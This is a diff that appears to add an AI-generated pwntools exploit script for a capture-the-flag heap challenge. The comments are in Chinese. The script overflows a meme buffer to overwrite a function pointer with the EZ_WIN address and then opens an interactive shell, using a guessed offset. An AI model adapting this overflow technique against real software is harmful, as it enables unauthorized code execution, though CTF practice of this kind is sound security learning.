@@ -134,3 +134,67 @@ AIMessage(content='To solve this challenge using pwntools, we can exploit a heap
  'unauthorized actions.\n'
  "- Understanding the binary's behavior through analysis or debugging can "
  'greatly assist in crafting a successful exploit.')
+
+from pwn import *
+
+# 加载二进制文件
+elf = ELF('./challenge')
+
+# 启动进程（或远程连接）
+# p = process('./challenge')
+# 对于远程连接，请取消注释以下行并提供正确的主机和端口：
+# p = remote('host', port)
+
+# 获取`EZ_WIN`函数的地址
+ez_win = elf.symbols['EZ_WIN']
+log.info(f'EZ_WIN address: {hex(ez_win)}')
+
+# 定义与菜单交互的帮助函数
+def new_meme(size, content):
+    p.sendlineafter('Choice: ', '1')
+    p.sendlineafter('Enter meme size: ', str(size))
+    p.sendafter('Enter meme content: ', content)
+    p.recvuntil('Done!\n')
+
+def edit_meme(index, content):
+    p.sendlineafter('Choice: ', '2')
+    p.sendlineafter('Index: ', str(index))
+    p.sendafter('Enter meme content: ', content)
+    p.recvuntil('Done!\n')
+
+def print_meme(index):
+    p.sendlineafter('Choice: ', '3')
+    p.sendlineafter('Index: ', str(index))
+
+# 开始利用
+if __name__ == '__main__':
+    # 启动进程
+    p = elf.process()
+
+    # 步骤1：创建一个新的meme，内容大小为16字节
+    log.info('Creating a new meme...')
+    new_meme(16, b'A' * 16)
+
+    # 步骤2：覆盖meme结构中的函数指针
+    # 溢出发生在`edit_meme`函数中使用`gets()`时
+    # 我们将溢出内容缓冲区以覆盖函数指针
+
+    # 计算函数指针的偏移量
+    # 由于内容缓冲区是单独分配的，我们需要找到正确的偏移量
+    # 为了演示，我们假设偏移量为24字节（你可能需要根据实际情况调整）
+
+    offset = 24  # 根据调试或试错调整此值
+
+    # 构造有效载荷
+    payload = b'A' * offset
+    payload += p64(ez_win)  # 覆盖函数指针为`EZ_WIN`的地址
+
+    log.info('Editing the meme to overwrite the function pointer...')
+    edit_meme(0, payload)
+
+    # 步骤3：通过打印meme触发利用
+    log.info('Triggering the exploit by printing the meme...')
+    print_meme(0)
+
+    # 步骤4：与shell交互
+    p.interactive()
